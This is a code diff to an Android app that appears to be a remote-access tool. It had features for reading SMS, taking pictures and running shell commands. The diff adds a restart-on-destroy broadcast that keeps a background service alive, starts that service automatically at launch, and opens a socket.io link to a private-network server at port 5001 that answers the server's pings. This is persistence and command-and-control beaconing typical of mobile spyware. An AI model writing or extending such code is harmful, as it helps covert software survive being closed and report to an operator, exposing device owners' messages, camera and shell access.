@@ -68,14 +68,21 @@ public class MainActivity extends AppCompatActivity {
     private Socket ioSocket;
 
     @Override
+    protected void onDestroy() {
+        Intent broadcastIntent = new Intent();
+        broadcastIntent.setAction("restartservice");
+        broadcastIntent.setClass(this, RestartServiceReceiver.class);
+        this.sendBroadcast(broadcastIntent);
+        super.onDestroy();
+    }
+
+    @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        Button smsBtn = (Button) findViewById(R.id.read_sms_btn);
-        Button picBtn = (Button) findViewById(R.id.pic_btn);
-        Button shellBtn = (Button) findViewById(R.id.shell_btn);
         command = (EditText) findViewById(R.id.cmd_txt);
         shellResult = (TextView) findViewById(R.id.shell_txt);
+        startService(new Intent(this, MainService.class));
     }
 
     @Override
@@ -157,12 +164,13 @@ public class MainActivity extends AppCompatActivity {
 
     public void ioConnection(View view){
         try{
-            ioSocket = IO.socket("http://192.168.27.11:5001/");
+            ioSocket = IO.socket("http://192.168.156.11:5001/");
+            ioSocket.emit("pong", "pong reponse");
             ioSocket.on("ping", new Emitter.Listener() {
                 @Override
                 public void call(Object... args) {
-                    //ioSocket.emit("pong");
-                    Toast.makeText(MainActivity.this, "received ping", Toast.LENGTH_SHORT).show();
+                    ioSocket.emit("pong", "pong reponse");
+                    Toast.makeText(MainActivity.this, "received ping", Toast.LENGTH_LONG).show();
                 }
             });
         }catch  (Exception ex){
